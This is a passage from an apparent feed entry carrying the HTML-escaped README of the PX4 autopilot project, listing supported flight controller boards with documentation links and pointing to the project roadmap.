href=&#34;https://docs.px4.io/master/en/flight_controller/pixhawk.html&#34;&gt;Pixhawk&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/pixfalcon.html&#34;&gt;Pixfalcon&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Manufacturer and Community supported&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/durandal.html&#34;&gt;Holybro Durandal&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/cubepilot_cube_orange.html&#34;&gt;Hex Cube Orange&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/cubepilot_cube_yellow.html&#34;&gt;Hex Cube Yellow&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.mindpx.net/assets/accessories/UserGuide_MindPX.pdf&#34;&gt;Airmind MindPX V2.8&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://mindpx.net/assets/accessories/mindracer_user_guide_v1.2.pdf&#34;&gt;Airmind MindRacer V1.2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/complete_vehicles/crazyflie2.html&#34;&gt;Bitcraze Crazyflie 2.0&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/omnibus_f4_sd.html&#34;&gt;Omnibus F4 SD&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/kakutef7.html&#34;&gt;Holybro Kakute F7&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/raspberry_pi_navio2.html&#34;&gt;Raspberry PI with Navio 2&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Additional information about supported hardware can be found in &lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/&#34;&gt;PX4 user Guide &amp;gt; Autopilot Hardware&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Project Roadmap&lt;/h2&gt; &#xA;&lt;p&gt;A high level project roadmap is available &lt;a href=&#34;https://github.com/orgs/PX4/projects/25&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
</feed>